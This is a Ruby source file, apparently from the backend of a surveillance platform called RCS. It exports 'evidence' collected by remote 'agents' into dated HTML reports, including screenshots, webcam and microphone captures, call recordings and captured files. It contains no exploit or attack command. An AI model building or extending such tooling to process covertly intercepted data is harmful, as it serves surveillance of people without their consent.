# encoding: UTF-8

require_relative '../tasks'

module RCS
module DB

class EvidenceTask
  include RCS::DB::SingleFileTaskType
  include RCS::Tracer

  def internal_filename
    'evidence.html'
  end

  def total
    num = ::Evidence.filtered_count @params
    trace :info, "Exporting #{num} evidence..."
    return num
  end
  
  def next_entry
    @description = "Exporting evidence"

    evidence = ::Evidence.filter @params

    export(evidence, index: :da, target: @params['filter']['target']) do
      yield
    end

    yield @description = "Ended"
  end

  ######################################################################################################

  def html_page_header
    <<-eof
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <link rel="stylesheet" type="text/css" href="style/evidence.css">
      <link rel="stylesheet" type="text/css" href="../style/evidence.css">
    </head>
    <body>
    eof
  end

  def html_page_footer
    <<-eof
    </body>
    </html>
    eof
  end

  def html_evidence_table_header(day)
    <<-eof
      <table>
        <caption>Evidence for #{day}</caption>
        <thead>
          <tr>
            <th scope="col" class="id">id</th>
            <th scope="col" class="agent">agent</th>
            <th scope="col" class="acquired">acquired</th>
            <th scope="col" class="received">received</th>
            <th scope="col" class="rel">tag</th>
            <th scope="col" class="type">type</th>
            <th scope="col" class="info">info</th>
            <th scope="col" class="note">note</th>
          </tr>
        </thead>
        <tbody>
    eof
  end

  def html_evidence_table_row(row)
    <<-eof
      <tr>
        <td class="id">#{row[:_id]}</td><td class="agent">#{row[:agent]}</td>
        <td class="acquired">#{Time.at(row[:da]).strftime('%Y-%m-%d %H:%M:%S')}</td><td class="received">#{Time.at(row[:dr]).strftime('%Y-%m-%d %H:%M:%S')}</td>
        <td class="rel#{row[:rel]}"></td><td class="type">#{row[:type]}</td>
        <td class="info">#{html_data_renderer(row)}</td><td class="note">#{row[:note]}</td>
      </tr>
    eof
  end

  def html_table_footer
    <<-eof
        </tbody>
      </table>
    eof
  end

  def html_summary_table_header
    <<-eof
      <table>
        <caption>Evidence for </caption>
        <thead>
          <tr>
            <th scope="col" class="date">date</th>
            <th scope="col" class="evidence">evidence statistics by hour</th>
          </tr>
        </thead>
        <tbody>
    eof
  end

  def html_summary_table_row(row)
    <<-eof
      <tr>
        <td class="date"><a href="#{row[:date]}/index.html">#{row[:date]}</a></td><td class="evidence">#{html_stat_renderer(row[:num])}</td>
      </tr>
    eof
  end

  def html_data_renderer(row)
    table = "<table class=\"inner\"><tbody>"
    # expand all the metadata
    row[:data].each_pair do |k, v|
      next if ['_grid', '_grid_size', 'md5', 'type'].include? k
      v.gsub! /\n/, '<br>'
      table += "<tr><td class=\"inner\">#{k}</td><td class=\"inner\">#{v}</td></tr>"
    end
    # add binary content
    case row[:type]
      when 'screenshot', 'camera', 'print'
        table += "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg')}</td></tr>"
      when 'mouse'
        table += "<tr><td class=\"inner\">image</td><td class=\"inner\">#{html_image(row[:data]['_grid'].to_s + '.jpg', 40)}</td></tr>"
      when 'call', 'mic'
        table += "<tr><td class=\"inner\">audio</td><td class=\"inner\">#{html_mp3_player(row[:data]['_grid'].to_s + '.mp3')}</td></tr>"
      when 'file'
        if row[:data]['type'] == :capture
          table += "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
        end
      end
    table += "</tbody></table>"
    table
  end

  def html_stat_renderer(data)
    max = data.max
    table = "<table class=\"stat\"><tbody><tr>"
    data.each_with_index do |value|
      h = value * 20 / max
      table += "<td class=\"stat\"><img src=\"style/stat.png\" height=\"#{h}\" width=\"6\"></td>"
    end
    table += "</tr><tr>"
    # put the hours
    (0..23).each {|h| table += "<td  class=\"stat\">#{'%02d' % h}</td>"}
    table += "</tr></tbody></table>"
    table
  end

  def html_image(image, size=80)
    <<-eof
    <a href="#{image}"><img src="#{image}" height="#{size}" ></a>
    eof
  end

  def html_mp3_player(mp3)
    <<-eof
    <audio src="#{mp3}" controls>
        HTML5 audio not supported
    </audio>
    <a href="#{mp3}" title="Download"><font size=3><b>⇊</b></font></a>
    eof
  end

  def begin_new_file(day)
    FileUtils.mkdir_p File.join(@export_dir, day)
    out = File.open(File.join(@export_dir, day, 'index.html'), 'wb+')
    out.write html_page_header
    out.write html_evidence_table_header day
    return out
  end

  def end_file(out)
    out.write html_table_footer
    out.write html_page_footer
    out.close
  end

  def dump_file(day, evidence, target)
    file = GridFS.get evidence[:data]['_grid'], target
    name = evidence[:data]['_grid'].to_s
    case evidence[:type]
      when 'screenshot', 'camera', 'mouse', 'print'
        name += '.jpg'
      when 'call', 'mic'
        name += '.mp3'
      when 'file'
        name += File.extname evidence[:data]['path']
    end
    File.open(File.join(@export_dir, day, name), 'wb+') {|f| f.write file.read}
  end

  def create_summary(summary)
    File.open(File.join(@export_dir, "index.html"), 'wb+') do |f|
      f.write html_page_header
      f.write html_summary_table_header

      summary.each_pair do |k,v|
        f.write html_summary_table_row date: k, num: v
      end

      f.write html_table_footer
      f.write html_page_footer
    end
  end

  def expand_styles
    Zip::ZipFile.open(Config.instance.file('export.zip')) do |z|
      z.each do |f|
        f_path = File.join(@export_dir, f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end
  end

  def export(evidence, opts)

    # set the output dir
    @export_dir = 'export'

    # expand the sytles in the dest dir
    expand_styles

    # the current file handler
    out = nil

    # date of the current file
    file_day = nil

    summary = {}

    evidence.each_with_index do |e, i|
      # get the day of the current evidence
      day = Time.at(e[opts[:index]]).strftime('%Y-%m-%d')
      # get the our of the evidence
      hour = Time.at(e[opts[:index]]).strftime('%H').to_i

      # this is the first element
      if i == 0
        file_day = day
        out = begin_new_file day
        summary[day] = Array.new(24, 0)
      end

      # if the date of the file is different from the day of the evidence
      # we need to begin a new file
      if file_day != day
        # close any pending file / table
        end_file out
        # create a new file
        out = begin_new_file day
        # remember the day of the file for the next iteration
        file_day = day
        summary[day] = Array.new(24, 0)
      end

      e[:agent] = ::Item.find(e[:aid]).name

      # write the current evidence
      out.write html_evidence_table_row e

      # export the binary file
      dump_file(day, e, opts[:target]) if e[:data]['_grid']

      # update the stat of the summary
      summary[day][hour] +=  1

      # this is the last element
      if i == evidence.length - 1
        end_file out
      end

      # give control to the caller
      yield

    end

    create_summary summary
  end

end

end # DB
end # RCS